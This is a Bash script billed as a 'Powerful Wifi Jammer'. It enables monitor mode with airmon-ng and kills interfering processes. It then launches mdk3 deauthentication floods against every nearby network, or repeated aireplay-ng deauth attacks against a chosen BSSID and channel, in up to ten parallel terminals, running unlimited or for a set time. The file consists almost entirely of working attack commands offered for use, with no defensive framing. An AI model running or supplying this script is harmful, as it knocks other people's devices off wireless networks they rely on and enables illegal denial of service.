#COLORS
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"

echo -e "___________________________"
echo -e "$Purple$bln          ▀      ▄▀▀    ▀        █    $nc"           
echo -e "$red▄     ▄ ▄▄▄    ▄▄█▄▄  ▄▄▄     ▄▄▄█   ▄▄▄    ▄▄▄$nc"    
echo -e "$Purple$bln▀▄ ▄ ▄▀   █      █      █    █▀ ▀█  █▀ ▀█  █   ▀ $nc"  
echo -e "$red █▄█▄█    █SURYA █      █    █   █  █   █   ▀▀▀▄ $nc"  
echo -e "$Purple$bln  █ █   ▄▄█▄▄    █    ▄▄█▄▄  ▀█▄██  ▀█▄█▀  ▀▄▄▄▀$nc"  
echo -e ""
echo -e "Author:- Anlos"
echo -e "Owner :- Anlos"
echo -e "Script:- Anlos"
echo -e "$blue$bln __@Copyrighted__Powerful Wifi Jammer By Anlos\e[5m(Anon)$nc" 
echo -e ""                                              
read -p $'\033[1;34m[*]PRESS ENTER START WIFI JAMMING/DOSING\033[0m'

echo -e "$red NOTE: *YOUR WIFI SHOULD BE ENABLED or TURN ON , DO NOT CONNECT ANY NETWORK$nc"
echo -e ""
airmon-ng &>/dev/null
echo -e "$white Collecting Data...$nc"
echo -e ""
iwlist wlan0 scan | GREP_COLOR='01;36' egrep --color=always 'ESSID\|Address\|Channel'
airmon-ng start wlan0 &>/dev/null
airmon-ng check kill &>/dev/null
echo -e "$white Checking And Killing Processes....$nc"
sleep 1s
echo ""
echo -e "$white Processes killed....$nc"
echo -e ""
sleep 1s
read -p "To Jam All the wifi networks write "y" or specific networks write "n" :" ynynyn
if [ $ynynyn = y ];then echo -e "yeah...WIFi started jamming check connection..." &
xterm -e airodump-ng wlan0mon &
xterm -e mdk3 wlan0mon d & 
xterm -e mdk3 wlan0mon d &
xterm -e mdk3 wlan0mon d &
else 
#timeout --signal=SIGINT 5
echo -e "If All the network is not Coming you can show in airodump Terminal"
echo ""
xterm -e airodump-ng wlan0mon &
echo -e "$white in the lists $nc"$red XX:XX:XX:XX:XX:XX$nc" $white is your attack's BSSID$nc"
echo -e ""
sleep 1s
echo -e "$white in the lists $nc"$red CH $nc" $white is your attack's channel$nc"
echo -e ""
sleep 1s
read -p $'\033[1;33m[*]Enter BSSID Here : \033[0m' bssid
echo ""
read -p $'\033[1;33m[*]Enter Attack CH (channel number) : \033[0m' ch
if [ $bssid = "" ]; then
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
fi

if [ $ch = "" ]; then
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
fi
echo -e "$green Please Wait.... $nc" 
xterm -e airodump-ng -c $ch --bssid $bssid wlan0mon &
echo -e "_________________________________________________________"
echo -e " #No.| Mode"
echo -e "---------------------------------------------------------"
echo -e " #$yellow 1.| Unlimited Jamming Duration$nc              #" 
echo -e " #$yellow 2.| Set Your Own Jamming Duratiom (Seconds) $nc#"
echo -e " #$yellow 3.| 1 to 10 terminal attack $nc#"
echo -e " ________________________________________________________"

echo -e ""
read -p $'\033[1;37m[*]Enter Number 1 or 3: \033[0m' nums
sleep 3s


if [ $nums = 1 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon 
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null & 
fi



if [ $nums = 2 ]; then
read -p $'\033[1;33m[*]Enter Duration In seconds : \033[0m' seco

echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 $seco -a $bssid wlan0mon 
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi


if [ $nums = 3 ]; then
read -p $'\033[1;33m[*]1 to 10 attacks : \033[0m' xoxo
fi
if [ $xoxo = 1 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon 
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi



if [ $xoxo = 2 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi



if [ $xoxo = 3 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon&
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon   
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi




if [ $xoxo = 4 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon&
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon   
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi


if [ $xoxo = 5 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi


if [ $xoxo = 6 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi



if [ $xoxo = 7 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi



if [ $xoxo = 8 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi



if [ $xoxo = 9 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi


if [ $xoxo = 10 ]; then
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  &
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon  
airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
echo -e "$red WifiDosing Stopped..😑$nc"
fi

airmon-ng stop wlan0mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &

fi



#airmon-ng stop wlan0
#service networking restart
#service network manager restart

